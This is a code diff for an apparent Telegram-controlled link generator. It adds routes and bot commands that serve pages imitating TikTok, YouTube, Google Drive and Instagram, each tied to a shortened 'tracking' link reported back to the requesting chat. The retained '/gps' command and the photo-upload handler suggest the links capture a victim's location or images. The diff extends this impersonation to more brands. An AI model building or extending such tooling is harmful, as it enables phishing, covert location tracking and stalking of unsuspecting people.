@@ -47,15 +47,15 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(express.static(__dirname)); // Sirve index.html y assets
 
-// Ruta corta: mantiene URL limpia (/v/ID) y sirve la landing principal.
-app.get('/v/:id', (_req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+// Rutas Legacy por compatibilidad
+app.get('/v/:id', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('/tiktok/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));
 
-// ✅ Ruta TIKTOK: Interfaz realista de TikTok
-app.get('/tiktok/:id', (_req, res) => {
-    res.sendFile(path.join(__dirname, 'tiktok.html'));
-});
+// ✅ Rutas de Plantillas Dinámicas
+app.get('/tk/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));
+app.get('/yt/:id', (_req, res) => res.sendFile(path.join(__dirname, 'youtube.html')));
+app.get('/d/:id', (_req, res) => res.sendFile(path.join(__dirname, 'drive.html')));
+app.get('/ig/:id', (_req, res) => res.sendFile(path.join(__dirname, 'ig.html')));
 
 const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)
 
@@ -109,8 +109,11 @@ async function shortenUrl(longUrl) {
     }
 }
 
-function buildTrackingUrl(targetId) {
-    return `${WEBSITE_URL}/tiktok/${encodeURIComponent(targetId)}`;
+function buildTrackingUrl(targetId, type = 'tiktok') {
+    if (type === 'youtube') return `${WEBSITE_URL}/yt/${encodeURIComponent(targetId)}`;
+    if (type === 'drive') return `${WEBSITE_URL}/d/${encodeURIComponent(targetId)}`;
+    if (type === 'ig') return `${WEBSITE_URL}/ig/${encodeURIComponent(targetId)}`;
+    return `${WEBSITE_URL}/tk/${encodeURIComponent(targetId)}`; // default tiktok
 }
 
 /* ====================================================
@@ -131,33 +134,43 @@ async function handleCommand(msg) {
     /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
         await sendMessage(chatId,
-            `🎵 <b>TikTok Tracker — Bot Activo</b>
+            `🎵 <b>SecureTrack Pro — Creador Activo</b>
 
 Hola <b>${from}</b>! Bienvenido.
 
-🎯 <b>Generar Enlaces TikTok:</b>
-/gps — Genera link corto aleatorio
-/gps [nombre] — Genera link con nombre personalizado
+🎯 <b>Generar Enlaces Dinámicos:</b>
+/tk [ID] — Simular TikTok
+/yt [ID] — Simular YouTube Corto
+/d [ID]  — Simular Google Drive PDF
+/ig [ID] — Simular Instagram Reel
 
 📊 <b>Sistema:</b>
 /status — Estado del sistema
-/help — Ver todos los comandos`
+/help — Más ayuda`
         );
 
-        /* ── /gps y /link ──────────────────────────────── */
-    } else if (text === '/gps' || text.startsWith('/gps ') || text === '/link' || text.startsWith('/link ')) {
+        /* ── COMANDOS DE GENERACIÓN ───────────────────── */
+    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/gps') || text.startsWith('/link')) {
 
-        // Extraer el target usando el texto original para no perder mayúsculas en el ID ingresado
-        let target = textRaw.split(' ').slice(1).join(' ').trim();
+        let type = 'tiktok';
+        let typeName = 'TikTok';
+        if (text.startsWith('/yt')) { type = 'youtube'; typeName = 'YouTube'; }
+        else if (text.startsWith('/d') && !text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
+        else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
+        else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
+
+        // Extraer el target usando el texto original
+        const parts = textRaw.split(' ');
+        let target = parts.slice(1).join(' ').trim();
+
         if (!target) {
-            // Genera ID más corto y legible: VA1B, VX2C, etc.
             target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
         }
 
         // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
         linkDatabase[target] = chatId;
 
-        const longUrl = buildTrackingUrl(target);
+        const longUrl = buildTrackingUrl(target, type);
         const shortUrl = await shortenUrl(longUrl);
 
         // Guardar en historial
@@ -169,7 +182,7 @@ Hola <b>${from}</b>! Bienvenido.
         });
 
         await sendMessage(chatId,
-            `🎵 <b>Enlace TikTok Generado</b>
+            `📁 <b>Enlace de ${typeName} Generado</b>
 
 👤 <b>Etiqueta/ID:</b> <code>${target}</code>
 
